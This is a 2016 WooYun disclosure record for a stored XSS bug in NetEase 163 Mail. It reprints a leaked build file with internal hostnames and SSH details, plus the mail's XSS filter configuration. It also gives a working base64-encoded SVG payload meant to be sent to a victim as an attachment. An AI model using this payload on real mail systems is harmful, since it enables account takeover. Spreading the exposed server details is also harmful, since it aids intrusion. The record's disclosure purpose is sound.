{"id": 84917, "wybug_id": "wooyun-2016-0170351", "wybug_title": "163网易邮箱存储型XSS漏洞", "wybug_corp": "网易", "wybug_author": "mramydnei", "wybug_date": "2016-01-16 13:10", "wybug_open_date": "2016-03-04 13:27", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-04：\t细节向公众公开  简要描述： 主要是抛出了一个异常，让问题变得简单了许多 详细说明：  通过网易邮箱测试内容量较大的htm文件的预览时，抛出了了这样的异常。\ncom.netease.mail.preview.exception.ProxyException: com.netease.security.xssdefender.filter.exception.TimeoutException: XSS filter timeouted!\n感觉类名挺个性的，就去github找了一下。发现了这个：\nhttps://github.com/RyanTech/spider-2/\nbuild.xml中多处出现163.org,netease的字样。这多半是和网易脱离不了干系了。\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE project [<!ENTITY buildfile SYSTEM \"file:./build-user.xml\">]><!-- WARNING: Eclipse autogenerated file.               Any modifications will be overwritten.              Please edit build-user.xml instead.--><project basedir=\".\" default=\"release\" name=\"pris-fetcher\">\t<property name=\"bin.dir\" value=\"bin\" />\t<property name=\"lib.dir\" value=\"lib\" />\t<property name=\"build.dir\" value=\"build\"/>\t<property name=\"release.dir\" value=\"release\"/>\t<property name=\"release.lib\" value=\"release/lib\"/>\t<property name=\"release.conf\" value=\"release/conf\"/>\t<property name=\"ssh.keyfile\" value=\"e:/id_rsa\"/>\t<!--清理任务-->\t<target name=\"clean\">\t\t<delete dir=\"${build.dir}\"/>\t</target>\t\t<!--创建目录-->\t<target name=\"init\" depends=\"clean\">\t\t<mkdir dir=\"${build.dir}\"/>\t</target>\t\t<path id=\"classpath\">\t\t<fileset dir=\"${lib.dir}\">\t\t\t<include name=\"*.jar\"/>\t\t</fileset>\t\t  \t</path>\t\t<target name=\"build\" depends=\"init\" description=\"Build jar\">\t\t<jar jarfile=\"${build.dir}/common.jar\" basedir=\"${bin.dir}\">\t\t\t<include name=\"com/netease/backend/collector/rss/common/**/*.class\"/>\t\t\t<exclude name=\"com/netease/backend/collector/rss/common/**/*Test.class\"/>\t\t</jar>\t\t<jar jarfile=\"${build.dir}/crawler.jar\" basedir=\"${bin.dir}\">\t\t\t<include name=\"com/netease/backend/collector/rss/crawler/**/*.class\"/>\t\t\t<include name=\"org/archive/crawler/**/*.class\"/>\t\t\t<exclude name=\"com/netease/backend/collector/rss/crawler/**/*Test.class\"/>\t\t</jar>\t\t<jar jarfile=\"${build.dir}/manager.jar\" basedir=\"${bin.dir}\">\t\t\t<include name=\"com/netease/backend/collector/rss/manager/**/*.class\"/>\t\t\t<exclude name=\"com/netease/backend/collector/rss/manager/**/*Test.class\"/>\t\t</jar>\t</target>\t\t\t<target name=\"common-release\" depends=\"build\">\t\t<delete>\t\t\t<fileset dir=\"${release.lib}\" includes=\"*.jar\"/>\t\t</delete>\t\t<copy todir=\"${release.lib}\">\t\t\t<fileset dir=\"${build.dir}\">\t\t\t\t<include name=\"*.jar\"/>\t\t\t</fileset>\t\t\t</copy>\t\t<copy todir=\"${release.lib}\">\t\t\t<fileset dir=\"${lib.dir}\">\t\t\t\t<include name=\"fetcher-common*.jar\" />\t\t\t\t<include name=\"dcas-analyzer*.jar\" />\t\t\t</fileset>\t\t\t</copy>\t</target>\t<!--release version-->\t<target name=\"release\" depends=\"common-release\">\t\t<delete>\t\t\t<fileset dir=\"${release.conf}\">\t\t\t\t<exclude name=\"**/.svn**\" />\t\t\t</fileset>\t\t</delete>\t\t<move todir=\"${release.conf}\">\t\t\t<fileset dir=\"${release.conf}\">\t\t\t</fileset>\t\t\t<mapper type=\"regexp\" from=\"^(.*)-online.(.*)$$\" to=\"\\1.\\2\" />\t\t</move>\t\t</target>\t\t<target name=\"test\" depends=\"common-release\">\t\t<delete>\t\t\t<fileset dir=\"${release.dir}/test-conf\">\t\t\t\t<exclude name=\"**/.svn**\" />\t\t\t</fileset>\t\t</delete>\t</target>\t\t<!--测试服务器重新启动-->\t<target name=\"restart-test\">\t\t<sshexec host=\"app-61.photo.163.org\" port=\"1046\"\t\t    username=\"yuedu\" trust=\"true\" keyfile=\"${ssh.keyfile}\" \t\t\tcommand=\"cd /home/yuedu/pris-fetcher/;svn up lib/ rss-lib/ common-conf/;\t\t\tsh duplicationFilter/bin/df.sh;sh start.sh;\"/>\t</target>\t\t<!--线上升级，所有节点更新jar和conf配置文件，然后重启所有节点-->\t<target name=\"upgrade-online\">\t\t<sshexec host=\"yuedu4.photo.163.org\" port=\"1046\"\t\t    username=\"yuedu\" trust=\"true\" keyfile=\"${ssh.keyfile}\" \t\t\tcommand=\"cd /home/yuedu/pris-fetcher/;svn up lib/ rss-lib/;sh start-df.sh;sh start.sh;\t\t\t cd /mnt/hdir/0/dcas-default;sh start.sh;\"/>\t\t<sshexec host=\"yuedu5.photo.163.org\" port=\"1046\"\t\t    username=\"yuedu\" trust=\"true\" keyfile=\"${ssh.keyfile}\" \t\t\tcommand=\"cd /mnt/hdir/0/pris-fetcher-news/;svn up lib/ rss-lib/;\t\t\tcd /home/yuedu/pris-fetcher-photo/;sh start.sh;\"/>\t\t<sshexec host=\"app-57.photo.163.org\" port=\"1046\"\t\t    username=\"dir\" trust=\"true\" keyfile=\"${ssh.keyfile}\" \t\t\tcommand=\"cd /home/dir/pris-fetcher-2/;svn up lib/ rss-lib/;sh start.sh;\t\t\tcd ../pris-fetcher-news-2/;sh start.sh;\"/>\t\t<sshexec host=\"app-48.photo.163.org\" port=\"1046\"\t\t    username=\"dir\" trust=\"true\" keyfile=\"${ssh.keyfile}\" \t\t\tcommand=\"cd /home/dir/pris-fetcher-2/;svn up lib/ rss-lib/;sh start.sh;\"/>\t</target></project>\n果断把下面的jar抱回家看了下，xss怎么过滤的：\nhttps://github.com/RyanTech/spider-2/blob/master/lib/xssdefender-1.3.6.jar\n看了下base-config.properties：\n####################################### base configuration for XSS Defender# @author: superekcah# format:# \tstring|value#\tset|value1,value2#\tmap|key1:value1,value2;key2:value3,value4####################################### 标签处理的实现类tagHandler=string|com.netease.security.xssdefender.filter.NodeFilter# 报警接口实现类alarm=string|# 标签白名单，空表示不使用白名单过滤tagsWhitelist=set|# 需要去除的标签，包括标签内容及子节点removeNodeTags=set|head,script,style,object,applet,noscript,frameset,noframes# 需要去除的标签本身，不包括内容及子节点removeTagOnlyTags=set|form,meta,body,html,label,select,optgroup,option,textarea,title,script,xmp,applet,embed,head,frameset,iframe,noframes,noscript,object,style,input,base,basefont,isindex,link,frame,param,xml,xss# 指定标签需要过滤的属性nodeAttrBlacklist=map|# 指定标签允许保留的属性nodeAttrWhitelist=map|img:src,alt,width,height;a:href,target,class;# 属性中需要检查的关键字，注：只检查是 否以这些词开始scriptKeywords=set|javascript,vbscript,script,actionscript# 允许保留的CSS样式，注：如果set中只有一个值all，则允许所有样式allowedStyleProps=set|font,font-size,font-weight,font-style,text-decoration,width,height,border,margin,padding# 通过正则表达验证URL属性，default对应默认检查项，空则表达只检查是否关键词开头urlValidators=map|default:^(https?://|/|#|mailto\\\\s*:).*# 需要过滤的属性，/regex/为正则表达，其他要求逐字匹配forbidAttributes=set|/on[a-zA-Z]+/,allowScriptAccess,allowNetworking,disabled# 需要检查关键词开始的属性keywordsCheckedAttributes=set|background\n过滤了什么没过滤什么一目了然，也就没啥好分析的了。构造poc，pwn之。   漏洞证明：  将下面的内容存储为pwn.htm\n<svg><use xlink:href=\"data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle\" /></svg>\n添加到邮件附件，发送给victim。victim对文件进行浏览时：\n\n游戏就结束了。上面的poc需要在ff下进行验证。如果觉得影响范围不足够，可以和我联系。我可以进行进一步提供更通用的poc。最后，如果上述问题属于coremail的问题，麻烦告知一下我好去拿奖金。   修复方案：  removeNodeTags加一个svg？   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-01-19 15:38 厂商回复： 漏洞已确认，将于近期修复，感谢您对网易产品的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-16 13:10 |    \t\t隐形人真忙 \t\t\t( 普通白帽子  |\t\t\t        Rank:145 漏洞数:18        | 关注安全研发与漏洞)\t\t \n  fuzzing的吗？    \n     2016-01-16 13:17 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:17        | 膜拜学习中)\t\t \n  fuck    \n     2016-01-16 13:21 |    \t\t奈何彼岸 \t\t\t( 实习白帽子  |\t\t\t        Rank:90 漏洞数:38        | 乌云一下你就知道)\t\t \n  前排出售充气娃娃    \n     2016-01-16 13:24 |    \t\t404notfound \t\t\t( 普通白帽子  |\t\t\t        Rank:259 漏洞数:71        | 考研中，有事请留言)\t\t \n  特么又是你，小心你的肾    \n     2016-01-16 13:28 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:388 漏洞数:85        | 一个逗逼运维)\t\t \n  @404notfound 我的工具骚不骚？输ip生成报告。    \n     2016-01-16 13:29 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:17        | 膜拜学习中)\t\t \n  @mramydnei 输ip生成报告????    \n     2016-01-16 13:35 |    \t\t404notfound \t\t\t( 普通白帽子  |\t\t\t        Rank:259 漏洞数:71        | 考研中，有事请留言)\t\t \n  @mramydnei 无敌    \n     2016-01-16 13:39 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:388 漏洞数:85        | 一个逗逼运维)\t\t \n  @隐形人真忙 不知道算不算白盒，看厂家怎么说了    \n     2016-01-16 13:47 |    \t\t木易 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:25        | 历代鬼谷子虽一人之力，却强于百万之师。一...)\t\t \n  看看    \n     2016-01-16 14:59 |    \t\tAK-47 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:7        | 开开心心挖洞，踏踏实实上学！)\t\t \n  洞主手上还有多少0day？    \n     2016-01-16 15:18 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:10        | 我是来打酱油的。)\t\t \n  专日邮箱。    \n     2016-01-16 20:54 |    \t\t少宇 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:7        | 多看书，多实践，多泡妹子！！)\t\t \n  MARK    \n     2016-01-16 23:35 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:67        | 天之屌，人之神！天人合一，乃屌神也！)\t\t \n  乌云在用163和苹果ID的把你们的账号盯紧了    \n     2016-01-18 15:30 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:388 漏洞数:85        | 一个逗逼运维)\t\t \n  @网易 快出来确认漏洞啊.. 再过两天就得被忽略了。    \n     2016-01-19 19:30 |    \t\t404notfound \t\t\t( 普通白帽子  |\t\t\t        Rank:259 漏洞数:71        | 考研中，有事请留言)\t\t \n  @mramydnei @网易  求忽略    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}